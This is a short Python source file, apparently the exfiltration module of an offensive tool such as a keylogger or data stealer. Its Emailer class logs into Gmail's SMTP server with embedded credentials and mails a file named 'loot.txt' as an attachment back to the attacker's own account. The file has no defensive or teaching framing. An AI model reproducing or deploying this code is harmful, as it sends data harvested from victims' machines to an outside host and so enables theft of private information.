import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart

class Emailer:
    def __init__(self, email, password):
        self.email = email 
        self.password = password

    def start(self):
        self.server = smtplib.SMTP('smtp.gmail.com', 587)
        self.server.starttls()

    def send(self, loot="loot.txt"):
        msg = MIMEMultipart()

        with open(loot, "rb") as f:
            part = MIMEApplication(f.read(), loot)

        part['Content-Disposition'] = 'attachment; filename="%s"' % loot
        msg.attach(part)

        self.server.login(self.email, self.password)
        self.server.sendmail(self.email, self.email, msg.as_string())

    def stop(self):
        self.server.quit()
